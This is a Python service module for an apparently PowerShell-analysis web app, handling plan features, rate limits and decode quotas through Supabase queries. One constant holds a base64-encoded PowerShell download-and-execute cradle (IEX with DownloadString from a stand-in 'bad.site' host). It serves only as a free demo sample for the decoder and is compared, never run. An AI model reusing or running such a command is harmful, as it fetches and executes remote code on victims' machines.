"""
Service for managing user plans and features
"""
from typing import Optional, Dict, Any
from datetime import datetime, timedelta
from services.session_manager import get_supabase_client

# ✅ Example command that doesn't count towards quota
EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA" -noExit'


async def check_session_rate_limit_from_db(
    session_id: str,
    user_id: Optional[str] = None,
    limit_per_hour: int = 10
) -> Dict[str, Any]:
    """
    Check rate limit based on actual database records
    
    Args:
        session_id: Session ID to check
        user_id: Optional user ID for authenticated users
        limit_per_hour: Maximum requests per hour
        
    Returns:
        Dictionary with rate limit status
    """
    try:
        supabase = get_supabase_client()
        
        # Calculate time window (last hour)
        window_start = datetime.utcnow() - timedelta(hours=1)
        
        # Query for analyses in the last hour
        query = supabase.table('powershell_analyses')\
            .select('id, created_at', count='exact')\
            .eq('session_id', session_id)\
            .gte('created_at', window_start.isoformat())
        
        # If user is authenticated, also count by user_id
        if user_id:
            query = query.eq('user_id', user_id)
        
        result = query.execute()
        current_count = result.count or 0
        
        print(f"[RATE LIMIT] Session: {session_id[:8] if session_id else 'NONE'}... | Count: {current_count}/{limit_per_hour}")
        
        within_limit = current_count < limit_per_hour
        
        # Calculate seconds until reset
        seconds_until_reset = None
        if not within_limit:
            # Get oldest record to calculate reset time
            oldest_query = supabase.table('powershell_analyses')\
                .select('created_at')\
                .eq('session_id', session_id)\
                .gte('created_at', window_start.isoformat())\
                .order('created_at', desc=False)\
                .limit(1)
            
            if user_id:
                oldest_query = oldest_query.eq('user_id', user_id)
            
            oldest_result = oldest_query.execute()
            
            if oldest_result.data and len(oldest_result.data) > 0:
                oldest_created_at = oldest_result.data[0]['created_at']
                oldest_time = datetime.fromisoformat(oldest_created_at.replace('Z', '+00:00'))
                reset_time = oldest_time + timedelta(hours=1)
                current_time = datetime.now(reset_time.tzinfo)
                seconds_until_reset = max(0, int((reset_time - current_time).total_seconds()))
        
        return {
            "within_limit": within_limit,
            "current_count": current_count,
            "limit": limit_per_hour,
            "window_seconds": 3600,
            "seconds_until_reset": seconds_until_reset,
            "reset_time": None
        }
        
    except Exception as e:
        print(f"[ERROR] DB Rate limit check: {type(e).__name__}")
        import traceback
        traceback.print_exc()
        # Fallback: deny access on error
        return {
            "within_limit": False,
            "current_count": 0,
            "limit": limit_per_hour,
            "window_seconds": 3600,
            "seconds_until_reset": 3600,
            "reset_time": None
        }


async def get_user_plan_features(user_id: str) -> Dict[str, Any]:
    """
    Get user's plan and associated features
    
    Args:
        user_id: User ID to check
        
    Returns:
        Dictionary with plan information and features
    """
    try:
        supabase = get_supabase_client()
        
        
        
        # Get user profile with plan information
        response = supabase.table('profiles')\
            .select('plan_id, plans(name, can_decode_commands, request_limit_per_hour, decode_limit_per_hour)')\
            .eq('id', user_id)\
            .single()\
            .execute()
        
        
        
        if not response.data:
            
            # Return default free plan features
            return {
                "plan_name": "free",
                "can_decode_commands": False,
                "request_limit_per_hour": 10,
                "decode_limit_per_hour": 5
            }
        
        plan_data = response.data.get('plans', {})
        
        
        result = {
            "plan_name": plan_data.get('name', 'free'),
            "can_decode_commands": plan_data.get('can_decode_commands', False),
            "request_limit_per_hour": plan_data.get('request_limit_per_hour', 10),
            "decode_limit_per_hour": plan_data.get('decode_limit_per_hour', 5)
        }
        
       
        
        return result
        
    except Exception as e:
        
        # Log only error type, not full details
        import traceback
        traceback.print_exc()
        # Return free plan as fallback
        return {
            "plan_name": "free",
            "can_decode_commands": False,
            "request_limit_per_hour": 10,
            "decode_limit_per_hour": 5
        }


async def can_user_decode_commands(user_id: Optional[str], session_id: Optional[str] = None, command: Optional[str] = None) -> dict:
    """
    Check if user has permission to decode commands
    
    Args:
        user_id: User ID to check (None for anonymous)
        session_id: Session ID for anonymous users
        command: Optional command to check if it's the example (won't count towards quota)
        
    Returns:
        Dictionary with decode permission and usage details
    """
    
    # ✅ If this is the example command, always allow decode without counting
    if command and command.strip() == EXAMPLE_ENCODED_COMMAND.strip():
        print(f"[DECODE CHECK] 🎯 EXAMPLE COMMAND DETECTED - Free decode granted!")
        return {
            "can_decode": True,
            "current_usage": 0,
            "limit": None,
            "remaining": None,
            "seconds_until_reset": None,
            "is_example": True
        }
    # For authenticated users, fetch their plan
    if user_id:
        plan_features = await get_user_plan_features(user_id)
        plan_name = plan_features.get("plan_name", "free")
        can_decode_unlimited_flag = plan_features.get("can_decode_commands", False)
        decode_limit = plan_features.get("decode_limit_per_hour", 5)
    else:
        # For anonymous users, check the 'guest' plan configuration from DB
        plan_name = "guest"
        guest_plan = await get_plan_by_name("guest")
        if guest_plan:
            can_decode_unlimited_flag = guest_plan.get("can_decode_commands", False)
            decode_limit = guest_plan.get("decode_limit_per_hour", 5)
        else:
            can_decode_unlimited_flag = False
            decode_limit = 5
    
    # If decode_limit is None, it means unlimited
    is_unlimited = decode_limit is None
    
    # Legacy check: if can_decode_commands is True AND decode_limit is None, it's unlimited.
    # If can_decode_commands is True but decode_limit is set, we respect the limit.
    # If plan is premium/enterprise, we force unlimited if DB config is missing (legacy fallback)
    if is_unlimited or (plan_name in ["premium", "enterprise"] and decode_limit is None):
        return {
            "can_decode": True,
            "current_usage": 0,
            "limit": None,
            "remaining": None,
            "seconds_until_reset": None
        }
    
    # Use the dynamic limit
    limit = decode_limit if decode_limit is not None else 5
    
    # Calculate current usage
    from datetime import datetime, timedelta
    
    window_start = datetime.utcnow() - timedelta(hours=1)
    supabase = get_supabase_client()
    
    # Query for analyses with decoded content (has_decoded_content = true)
    query = supabase.table('powershell_analyses')\
        .select('id, created_at', count='exact')\
        .gte('created_at', window_start.isoformat())\
        .eq('has_decoded_content', True)
        
    if user_id:
        query = query.eq('user_id', user_id)
        target_id = f"user:{user_id}"
    elif session_id:
        query = query.eq('session_id', session_id).is_('user_id', 'null')
        target_id = f"session:{session_id}"
    else:
        print("[DECODE_CHECK] No user_id or session_id provided, blocking decode.")
        return {
            "can_decode": False,
            "current_usage": 0,
            "limit": limit,
            "remaining": 0,
            "seconds_until_reset": 0
        }
        
    result = query.execute()
    current_usage = result.count or 0
    
    can_decode = current_usage <= limit
    
    # ✅ FIX: Calculate seconds until reset using the oldest record's created_at
    seconds_until_reset = None
    if not can_decode:
        # Query again to get the actual records with created_at
        records_query = supabase.table('powershell_analyses')\
            .select('created_at')\
            .gte('created_at', window_start.isoformat())\
            .eq('has_decoded_content', True)
        
        if user_id:
            records_query = records_query.eq('user_id', user_id)
        elif session_id:
            records_query = records_query.eq('session_id', session_id).is_('user_id', 'null')
        
        records_result = records_query.order('created_at', desc=False).limit(1).execute()
        
        if records_result.data and len(records_result.data) > 0:
            oldest_created_at = records_result.data[0]['created_at']
            oldest_time = datetime.fromisoformat(oldest_created_at.replace('Z', '+00:00'))
            reset_time = oldest_time + timedelta(hours=1)
            current_time = datetime.now(reset_time.tzinfo)
            seconds_until_reset = max(0, int((reset_time - current_time).total_seconds()))
        else:
            # Fallback: If no records but limit reached (edge case)
            seconds_until_reset = 3600
    
    print(f"[DECODE_CHECK] {target_id} | Plan: {plan_name} | Can decode: {can_decode} | Used (DB): {current_usage}/{limit} | Reset in: {seconds_until_reset}s")
    
    return {
        "can_decode": can_decode,
        "current_usage": current_usage,
        "limit": limit,
        "remaining": max(0, limit - current_usage),
        "seconds_until_reset": seconds_until_reset
    }


async def get_plan_by_name(plan_name: str) -> Optional[Dict[str, Any]]:
    """
    Get plan information by name
    
    Args:
        plan_name: Name of the plan (free, premium, enterprise)
        
    Returns:
        Plan information or None
    """
    try:
        supabase = get_supabase_client()
        
        response = supabase.table('plans')\
            .select('*')\
            .eq('name', plan_name)\
            .single()\
            .execute()
        
        return response.data if response.data else None
        
    except Exception as e:
        print(f"[ERROR] Fetching plan: {type(e).__name__}")
        return None


async def get_all_plans() -> list:
    """
    Get all available plans
    
    Returns:
        List of all plans with their features
    """
    try:
        supabase = get_supabase_client()
        
        response = supabase.table('plans')\
            .select('*')\
            .order('id')\
            .execute()
        
        return response.data if response.data else []
        
    except Exception as e:
        print(f"[ERROR] Fetching plans: {type(e).__name__}")
        return []
